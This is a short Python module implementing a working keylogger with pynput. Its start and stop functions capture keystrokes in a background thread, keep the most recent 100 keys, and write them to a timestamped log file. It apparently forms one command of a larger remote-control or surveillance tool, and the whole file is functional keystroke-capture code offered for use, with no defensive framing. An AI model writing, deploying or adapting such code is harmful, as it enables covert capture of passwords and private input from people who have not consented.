import pynput.keyboard
import threading
import datetime
import logging
from threading import Lock

logger = logging.getLogger(__name__)
keylogger_lock = Lock()
keylogger_active = False
keylogger_log = []

def start_keylogger():
    global keylogger_active, keylogger_log
    try:
        with keylogger_lock:
            if keylogger_active:
                return {"error": "Keylogger already running"}
            keylogger_active = True
            keylogger_log = []
            def on_press(key):
                if not keylogger_active:
                    return False
                try:
                    keylogger_log.append(str(key))
                    if len(keylogger_log) > 100:
                        keylogger_log.pop(0)
                except:
                    pass
            listener = pynput.keyboard.Listener(on_press=on_press)
            threading.Thread(target=listener.start, daemon=True).start()
            return {"status": "Keylogger started"}
    except Exception as e:
        logger.error(f"Keylogger start error: {str(e)}")
        return {"error": f"Keylogger start failed: {str(e)}"}

def stop_keylogger():
    global keylogger_active, keylogger_log
    try:
        with keylogger_lock:
            if not keylogger_active:
                return {"error": "Keylogger not running"}
            keylogger_active = False
            log_file = f"logs/keys_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            with open(log_file, 'w') as f:
                f.write("\n".join(keylogger_log))
            keylogger_log = []
            return {"status": "Keylogger stopped", "log_file": log_file}
    except Exception as e:
        logger.error(f"Keylogger stop error: {str(e)}")
        return {"error": f"Keylogger stop failed: {str(e)}"}